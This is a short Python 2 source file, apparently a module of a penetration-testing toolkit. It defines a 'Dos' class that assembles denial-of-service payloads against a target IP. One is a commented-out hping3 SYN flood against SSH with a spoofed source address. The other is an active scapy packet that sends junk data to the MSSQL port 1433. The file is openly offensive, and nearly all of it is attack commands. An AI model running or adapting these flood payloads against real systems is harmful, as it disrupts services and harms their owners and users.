#!/usr/bin/env python

class Dos():
    def __init__(self, target):
        self.payloads = []
        self._target = target
        self._sudo  = "/usr/bin/sudo"
        self._nmap = "/usr/bin/nmap"
        self._niktobin = "/pentest/scanners/nikto-2.1.4/nikto.pl"
        self._niktocnf = "/pentest/scanners/nikto-2.1.4/nikto.conf"
        self._hping3 = "/usr/sbin/hping3"

    def getPayloads(self):

        ### hping SYN flood against SSH with spoofed IP
        # /!\ Issue: this payload is looping and never stopping...

#        self.payloads.append([
#            "hping SYN flood against SSH with spoofed IP",
#            "command",
#            [self._sudo, self._hping3, self._target, '-I', 'wlan0', '-a', '192.168.100.10', '-S', '-p', '22', '--flood']
#            ])

        ### DoS against MSSQL
        self.payloads.append([
            "DoS against MSSQL",
            "scapy",
            """sr1(IP(dst="%s")/TCP(dport=1433)/"0"*1000)""" % self._target
        ])

        return self.payloads

if __name__ == "__main__":
    print Dos("192.168.100.48").getPayloads()